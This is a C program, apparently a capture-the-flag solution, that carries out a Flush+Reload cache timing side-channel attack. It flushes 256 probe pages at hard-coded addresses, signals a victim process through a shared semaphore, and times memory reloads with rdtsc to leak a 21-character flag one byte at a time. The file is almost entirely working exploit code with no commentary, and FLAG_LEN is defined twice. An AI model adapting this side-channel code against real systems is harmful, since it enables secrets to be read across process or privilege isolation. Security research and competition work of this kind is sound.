#define _GNU_SOURCE

#include <unistd.h>
#include <x86intrin.h>
#include <inttypes.h>
#include <stdio.h>
#include <semaphore.h>
#include <sched.h>

#define PAGE_SIZE 0x1000
#define FLAG_LEN 21
#define FLAG_LEN 21
#define TIMING_THRESHOLD 230

uint64_t flush_reload(char *ptr) {
	uint64_t nope;
	uint64_t start, end;

	start = __rdtsc();
  _mm_lfence();
	nope = *(volatile uint64_t*) ptr;
  _mm_lfence();
	end = __rdtsc();
  _mm_mfence();
	_mm_clflush(ptr);
	return end - start;
}

void pin_cpu(int cpu) {
  cpu_set_t my_set;
  CPU_ZERO(&my_set);
  CPU_SET(cpu, &my_set);
  sched_setaffinity(0, sizeof(my_set), &my_set);
}

int main() {
  char leaked[100];
  int leaked_chars = 0;
  for (int i = 0; i < FLAG_LEN; i++) {
    leaked[i] = ' ';
  }
  sem_t *sem = (sem_t *) 0x1337000;

  char *ptr_base = 0x1338000;

  int *index = (int *) (sem + 1);

  uint64_t fastest_timing, time;
  pin_cpu(0);
  
  *index = 0;

  while (leaked_chars < FLAG_LEN) {
    *index = (*index + 1) % (FLAG_LEN + 1);
    if (leaked[*index] != ' ') {
      continue;
    }
    for (int k = 0; k < 256; k++) {
      _mm_clflush((char *) (0x1338000 + k * PAGE_SIZE));
    }
    sem_post(sem);
    for (int i = 0; i < 256; i++) {
      int mixed_index = ((i * 167) + 13) & 255;
      char *deref_me = ptr_base + mixed_index * PAGE_SIZE;

        if(flush_reload(deref_me) < (uint64_t) TIMING_THRESHOLD) {
          if((mixed_index >= '.' && mixed_index <= '}') && leaked[*index] == ' ') {
            leaked[*index] = mixed_index;
            leaked_chars++;
            printf("%d - leaked: %s\n", leaked_chars, leaked);
          }
        }
    }
  }
  return;
}
